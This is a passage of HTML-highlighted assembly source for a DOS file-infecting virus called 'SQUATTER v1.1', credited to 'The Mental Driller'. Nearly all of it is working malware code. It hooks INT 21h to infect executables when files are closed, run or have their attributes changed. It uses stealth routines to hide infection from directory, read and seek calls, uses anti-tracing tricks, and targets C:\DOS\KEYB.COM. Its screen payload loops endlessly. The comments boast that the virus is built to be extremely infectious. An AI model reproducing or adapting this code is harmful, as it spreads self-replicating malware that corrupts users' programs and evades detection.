        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">   </span><span class="sc1">; Save new int 21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; address</span><span class="sc0">
  </span><span class="sc5">@@Fin1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; IRET or RETF?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin2</span><span class="sc0">        </span><span class="sc1">; Let's go with RETF</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">
  </span><span class="sc5">@@Fin2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">
</span><span class="sc5">NewInt01h</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; More memory write zones</span><span class="sc0">
</span><span class="sc5">Basura1</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;; PAYLOAD AND IDENTIFICATION OF THE VIRUS</span><span class="sc0">

</span><span class="sc5">Mensaje</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"I've just squattered your system... again!!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">Mensaje2</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' -  SQUATTER v1.1 - Coded by The Mental Driller'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura2</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;; AMAZING PAYLOAD!</span><span class="sc0">
</span><span class="sc1">;;; It puts on screen "I've just squattered your system... again!" and plays</span><span class="sc0">
</span><span class="sc1">;;; with the second chain displaying a colorful weird composition on screen :)</span><span class="sc0">
</span><span class="sc1">;;; It rocks, due to the thing it does and the size it has.</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc0">     </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">   </span><span class="sc1">; Blank screen</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">     </span><span class="sc1">; DS equal to CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B800h</span><span class="sc0"> </span><span class="sc1">; ES=Text mode video segment</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  </span><span class="sc5">@@Premio</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">    </span><span class="sc1">; Color value</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0043d</span><span class="sc0">  </span><span class="sc1">; Put first chain</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mensaje</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0006</span><span class="sc0">
    </span><span class="sc5">@@Loop1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loop1</span><span class="sc0">

</span><span class="sc1">;; Trippy starts! XD</span><span class="sc0">
    </span><span class="sc5">@@Premio2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">     </span><span class="sc1">; Save ES</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; ES=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">046Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get timer value</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; Multiply it by 8</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">046Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; XOR it with first timer value</span><span class="sc0">
        </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">        </span><span class="sc1">; Get another timer value in AL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">         </span><span class="sc1">; Recover ES</span><span class="sc0">
                       </span><span class="sc1">; All this code is to get a value that</span><span class="sc0">
                       </span><span class="sc1">; changes slightly every time, and after</span><span class="sc0">
                       </span><span class="sc1">; a few seconds performs a "jump" of</span><span class="sc0">
                       </span><span class="sc1">; bigger value</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFEh</span><span class="sc0">      </span><span class="sc1">; Set off 4 top bits and the lowest bit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Put this value on DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0048d</span><span class="sc0">      </span><span class="sc1">; Copy the second chain on ES:DI, with</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Mensaje2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; color AL</span><span class="sc0">
    </span><span class="sc5">@@Loop2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loop2</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Premio</span><span class="sc0">        </span><span class="sc1">; Repeat all over and over again</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0">     </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">Basura5</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;; NEW INTERRUPTION 21h ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; It handles lots of functions. The virus will infect archives if you use FCB</span><span class="sc0">
</span><span class="sc1">;; functions, too. Well, I wanted to do it extremely infectious :)</span><span class="sc0">

</span><span class="sc5">NewInt21h</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; To avoid tracing (it can be patched, so</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; it's only basic protection instructions)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Continua001</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Fuck tracer :)</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">
</span><span class="sc5">@@Continua001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">      </span><span class="sc1">; Install check?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SigueInt</span><span class="sc0">     </span><span class="sc1">; If not, continue</span><span class="sc0">

</span><span class="sc5">@@InstallCheck</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSHA</span><span class="sc0">            </span><span class="sc1">; Save all registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">       </span><span class="sc1">; Get on ES:DI the address of return to</span><span class="sc0">
        </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the calling program</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Get on DS:SI the same position it would</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; be if the calling program is the virus</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">InicioChequeo</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongCheck</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">          </span><span class="sc1">; Check virus and program</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">  </span><span class="sc5">@@CheckOK</span><span class="sc0">      </span><span class="sc1">; If CX reached 0 value, the calling pro-</span><span class="sc0">
                      </span><span class="sc1">; gram is the virus</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; If not, execute real int 21h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">
</span><span class="sc5">@@CheckOK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongCheck</span><span class="sc0"> </span><span class="sc1">; Add displacement to re-</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; turn value and return</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">

  </span><span class="sc5">@@SigueInt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">     </span><span class="sc1">; Terminate program?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Infecta</span><span class="sc0">     </span><span class="sc1">; If it is, infect it!</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; Terminate program?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Infecta</span><span class="sc0">     </span><span class="sc1">; If it is, infect it!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">     </span><span class="sc1">; Terminate program?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Infecta</span><span class="sc0">     </span><span class="sc1">; If it is, infect it! :)</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">     </span><span class="sc1">; Set new DTA?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@NuevoDTA</span><span class="sc0">    </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">     </span><span class="sc1">; Close handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaHandle</span><span class="sc0"> </span><span class="sc1">; If it is, infect handle!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Close FCB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaFCB</span><span class="sc0">  </span><span class="sc1">; If it is, infect FCB!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">; Get/set attributes?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@InfectaAtributos</span><span class="sc0"> </span><span class="sc1">; If it is, infect file!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">     </span><span class="sc1">; Set interrupt vector?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FijarVector</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">     </span><span class="sc1">; Get interrupt vector?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@ObtenerVector</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">   </span><span class="sc1">; Get date/time from a handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HoraFechaHandle</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">     </span><span class="sc1">; Delete file via handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfectaHandle</span><span class="sc0"> </span><span class="sc1">; Disinfect file, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">     </span><span class="sc1">; Delete file via FCB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfectaFCB</span><span class="sc0"> </span><span class="sc1">; Disinfect file, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NoStealth</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Avoid stealth?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinInt21h</span><span class="sc0">           </span><span class="sc1">; If yes, jump and end</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">; Get first/next directory entry (FCB)?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Salto0001</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@StealthDIR</span><span class="sc0">    </span><span class="sc1">; If it is, stealth it!</span><span class="sc0">
</span><span class="sc5">@@Salto0001</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Dh</span><span class="sc0">      </span><span class="sc1">; Get first/next directory entry (handle)?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Salto0002</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@StealthDIR</span><span class="sc0">   </span><span class="sc1">; If it is, stealth it!</span><span class="sc0">
</span><span class="sc5">@@Salto0002</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">      </span><span class="sc1">; Execute program? (4Bh)</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@Salto0000</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@DesinfectaHandle</span><span class="sc0"> </span><span class="sc1">; If it is, disinfect file</span><span class="sc0">
</span><span class="sc5">@@Salto0000</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">        </span><span class="sc1">; Open file via handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfectaHandle</span><span class="sc0"> </span><span class="sc1">; Disinfect file, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ch</span><span class="sc0">        </span><span class="sc1">; Open file via handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfectaHandle</span><span class="sc0"> </span><span class="sc1">; Disinfect file, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">        </span><span class="sc1">; Open file via FCB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DesinfectaFCB</span><span class="sc0">    </span><span class="sc1">; Disinfect file, then</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">      </span><span class="sc1">; Get date/time from handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HoraFechaHandle</span><span class="sc0"> </span><span class="sc1">; Then, stealth it!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">        </span><span class="sc1">; Read from handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@LeeHandle</span><span class="sc0">      </span><span class="sc1">; If it is... stealth it!</span><span class="sc0">
     </span><span class="sc1">;   CMP     AH, 40h      ; Prepared for write to handle, but</span><span class="sc0">
     </span><span class="sc1">;   JZ    @@EscribeHandle    ; due to problems it has been set off</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">        </span><span class="sc1">; Pointer seek on handle?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@StealthPuntero</span><span class="sc0"> </span><span class="sc1">; If it is, stealth it!</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc0">        </span><span class="sc1">; Get file size via FCB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@TamanyoArchivoFCB</span><span class="sc0"> </span><span class="sc1">; If it is, stealth it!</span><span class="sc0">
  </span><span class="sc5">@@FinInt21h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">AntInt21h</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Jump to real int 21h</span><span class="sc0">

</span><span class="sc1">;; The virus will infect this path on the second time a terminate function is</span><span class="sc0">
</span><span class="sc1">;; called</span><span class="sc0">
</span><span class="sc5">RutaKEYB</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc12">'C:\DOS\KEYB.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura6</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; To infect KEYB.COM</span><span class="sc0">
</span><span class="sc5">@@InfectaKEYB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">  </span><span class="sc1">; Set DS:DX to CS:RutaKEYB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">RutaKEYB</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SigueInfec02</span><span class="sc0">  </span><span class="sc1">; Jump to infect it</span><span class="sc0">

</span><span class="sc1">;; Infect FCB</span><span class="sc0">
</span><span class="sc5">@@InfectaFCB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSHA</span><span class="sc0">       </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenNombreFCB</span><span class="sc0"> </span><span class="sc1">; Get in DS:DX the name of the file</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Bh</span><span class="sc0">        </span><span class="sc1">; Set this value to AH to aprofite the</span><span class="sc0">
                       </span><span class="sc1">; routine</span><span class="sc0">
